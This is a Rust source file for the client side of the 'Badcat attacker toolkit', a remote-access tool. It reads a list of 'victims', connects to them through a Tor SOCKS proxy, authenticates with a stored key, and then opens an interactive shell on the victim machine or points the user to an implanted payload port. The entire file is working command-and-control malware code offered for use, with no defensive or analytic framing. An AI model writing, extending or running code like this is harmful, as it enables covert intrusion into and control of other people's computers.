mod setting;

extern crate clap;

use std::io::{Read, Write};
use std::net::TcpStream;
use std::{error, io, path, thread, time};

use badcat_lib::io::pipe_io;
use clap::{App, Arg};
use socks::Socks5Stream;

fn main() -> Result<(), Box<dyn error::Error>> {
    let matches = App::new("Badcat attacker toolkit")
        .arg(
            Arg::with_name("hosts")
                .short("-f")
                .long("--hosts-file")
                .help("Sets hosts file")
                .takes_value(true)
                .required(true),
        )
        .arg(
            Arg::with_name("tor_socks_address")
                .short("-t")
                .long("--socks-addr")
                .takes_value(true)
                .default_value("127.0.0.1:9050")
                .help("Sets a custom tor socks address"),
        )
        .get_matches();

    let hosts_file = path::PathBuf::from(matches.value_of("hosts").unwrap());
    let socks_address = matches.value_of("tor_socks_address").unwrap();
    let settings = setting::from(&hosts_file)?;

    println!("Badcat attacker toolkit. Connect to your hosts");
    println!("Type help for commands.");
    println!("");

    loop {
        print!("# ");
        io::stdout().flush().unwrap();

        let mut command = String::new();
        io::stdin().read_line(&mut command)?;

        let command = command.strip_suffix("\n").unwrap();

        if command.is_empty() {
            //
        } else if command == "help" {
            println!("#### Available commands");
            println!("");
            println!("`help` - Shows this message");
            println!("`exit` - Leave this console");
            println!("`list` - List all loaded victims from settings");
            println!("`connect {{ TARGET_ID }}` - Connect to victim by ID. Example: connect 0");
        } else if command == "list" {
            for (index, setting) in settings.iter().enumerate() {
                println!("{} {} {}  {}", index, &setting.name, &setting.uses_payload, &setting.address[..6]);
            }
        } else if command == "exit" {
            println!("fair well");
            break;
        } else if command.starts_with("connect") {
            let target_id = match command.split_once(" ") {
                Some((_, id)) => id,
                None => {
                    println!("missing TARGET_ID argument.");
                    continue;
                }
            };

            match target_id.parse::<usize>() {
                Ok(target_id) => {
                    if target_id < settings.len() {
                        let target = &settings[target_id];

                        if let Ok(mut stream) = connect_to(&target, socks_address) {
                            match authenticate(&mut stream, &target) {
                                Ok(succeeded) => {
                                    if succeeded {
                                        if target.uses_payload {
                                            println!(
                                                "Your payload should be accessible now at: {}:PAYLOAD_PORT",
                                                target.address
                                            );
                                        } else {
                                            bind_shell(stream).unwrap_or_else(|_| {
                                                //
                                            });
                                            println!("connection closed.");
                                        }
                                    } else {
                                        println!("you are not authenticated to this host");
                                    }
                                },
                                Err(err) => println!("problem authenticating: {:?}", err)
                            }
                        };
                    } else {
                        println!("ERROR: select an existing TARGET_ID");
                    }
                }
                Err(_) => println!("ERROR: invalid TARGET_ID: {}", target_id),
            };
        } else {
            println!("ERROR: unknow command: {}", command);
        }
    }

    Ok(())
}

fn connect_to(
    setting: &setting::Setting,
    socks_address: &str,
) -> Result<TcpStream, Box<dyn error::Error>> {
    let max_attempts = 5;
    let mut attempt = 0;

    while attempt < max_attempts {
        println!("trying to connect (attempt {})...", attempt);

        match Socks5Stream::connect(
            socks_address,
            String::from(format!("{}:80", &setting.address)).as_str(),
        ) {
            Ok(s) => {
                println!("connected to: {:?}", s.proxy_addr());
                return Ok(s.into_inner());
            },
            Err(error) => {
                println!("problem connecting: {:?}", error);
                println!("sleeping 10s...");
                thread::sleep(time::Duration::from_secs(10));
            }
        };

        attempt += 1;
    }

    Err(format!("problem connecting to host: {:?}", &setting.address).into())
}

fn authenticate(
    stream: &mut TcpStream,
    setting: &setting::Setting
) -> Result<bool, Box<dyn error::Error>> {
    let buf = setting.key.as_bytes();

    if let Err(err) = stream.write(&buf) {
        return Err(err.into());
    }

    if let Err(err) = stream.flush() {
        return Err(err.into());
    }

    let mut reply = [0];
    if let Err(err) = stream.read_exact(&mut reply) {
        return Err(err.into());
    }

    Ok(reply[0] == 1)
}

fn bind_shell(stream: TcpStream) -> Result<(), Box<dyn error::Error>> {
    println!("opening the default badcat shell...");
    println!("");
    println!("note: when you exit the shell, keep pressing Enter until it exits");
    println!("");
    println!("");
    println!("");

    let stream_reader = stream.try_clone()?;
    let stream_writer = stream.try_clone()?;

    // read from socket, write to stdout
    let in_thread = pipe_io(stream_reader, io::stdout());

    // read from stdin, write to socket
    let out_thread = pipe_io(io::stdin(), stream_writer);

    in_thread.join().unwrap();
    out_thread.join().unwrap();

    Ok(())
}
